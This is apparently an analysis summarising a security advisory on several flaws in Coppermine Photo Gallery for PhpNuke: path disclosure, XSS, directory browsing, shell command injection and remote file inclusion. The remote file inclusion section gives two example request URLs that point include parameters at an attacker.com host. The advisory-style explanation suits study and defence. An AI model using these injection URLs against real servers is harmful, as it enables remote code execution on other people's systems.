Based on the provided content, here's a breakdown of the vulnerabilities in Coppermine Photo Gallery for PhpNuke, as described in the waraxe advisory:

**Vulnerabilities:**

*   **A. Full path disclosure:**
    *   **Root cause:** Several scripts within the Coppermine package lack proper access protection, leading to PHP error messages that reveal the full server path to the scripts.
    *   **Weaknesses:** Lack of access control on multiple PHP scripts, resulting in verbose error messages.
    *   **Impact:** Exposes the server's file system structure, aiding attackers in planning further attacks.
    *   **Attack vector:** Direct access to unprotected PHP files.
    *   **Required attacker capabilities:** None, the scripts are accessible without authentication.

*   **B. Cross-site scripting (XSS):**
    *   **Root cause:** The `menu.inc.php` script does not sanitize the `CPG_URL` parameter, allowing an attacker to inject malicious JavaScript.
    *   **Weaknesses:** Insufficient input validation for the `CPG_URL` parameter in `menu.inc.php`.
    *  **Impact:**  Allows for stealing cookies or performing actions on behalf of the victim, bypassing cross-domain security restrictions.
    *   **Attack vector:** Malicious code injection via the `CPG_URL` parameter.
    *   **Required attacker capabilities:** Ability to craft a malicious URL.

*   **C. Arbitrary directory browsing:**
    *   **Root cause:** The `searchnew` function in the `modules.php` script does not properly validate the `startdir` parameter, allowing an attacker to navigate outside the intended directory.
    *   **Weaknesses:** Insufficient input validation for the `startdir` parameter.
    *   **Impact:** Attackers can browse the file system on the server.
    *   **Attack vector:** Manipulating the `startdir` parameter in the `modules.php` script.
    *   **Required attacker capabilities:** Admin rights to PhpNuke.

*   **D. Arbitrary shell command execution:**
    *  **Root cause:** The `picmgmtbatch.inc.php` script utilizes the `exec()` function to execute shell commands for image manipulation, using configuration parameters (`$CONFIG['impath']`, `$CONFIG['jpeg_qual']`, etc.) without proper sanitization. An attacker with admin privileges can manipulate these parameters to inject malicious shell commands.
    *   **Weaknesses:** Unsafe use of the PHP `exec()` function with unsanitized configuration parameters.
    *   **Impact:** Arbitrary command execution on the server.
    *  **Attack vector:** Injecting shell commands via configuration parameters such as  `impath` through the admin interface.
    *   **Required attacker capabilities:** Admin rights to PhpNuke.

*   **E. Remote file inclusion (RFI):**
    *   **Root cause:** Several scripts include external files using user-controlled parameters (e.g., `CPG_M_DIR` or `THEME_DIR`) without proper validation.
    *   **Weaknesses:** Lack of validation of included file paths.
    *   **Impact:** Arbitrary PHP code execution via included files.
    *   **Attack vector:** Providing a URL to a malicious file via the vulnerable parameters.
    *   **Required attacker capabilities:** Ability to host a PHP file on a remote server.

    *   **E1 - Old Version:**
        *   Vulnerable script: `init.inc.php`
        *   Vulnerable parameter: `CPG_M_DIR`
        *   Attack Example: `<http://localhost/nuke69j1/modules/coppermine/include/init.inc.php?CPG_M_DIR=http://attacker.com>`

    *   **E2 - New Version:**
        *   Vulnerable script:  `theme.php` in various themes (default, coppercop, maze).
        *   Vulnerable parameter: `THEME_DIR`
        *   Attack Example: `<http://localhost/nuke72/modules/coppermine/themes/default/theme.php?THEME_DIR=http://attacker.com>`

**Additional Notes:**

*   The advisory notes that for vulnerabilities C and D, the attacker requires admin privileges for PhpNuke. However, it is also noted that PhpNuke is known for many security bugs which can lead to admin account compromise.
*   The attacker's server hosting the included file for RFI vulnerabilities must not parse PHP.

This detailed breakdown provides a good understanding of the technical aspects of these vulnerabilities, more comprehensive than the typical brief CVE description.
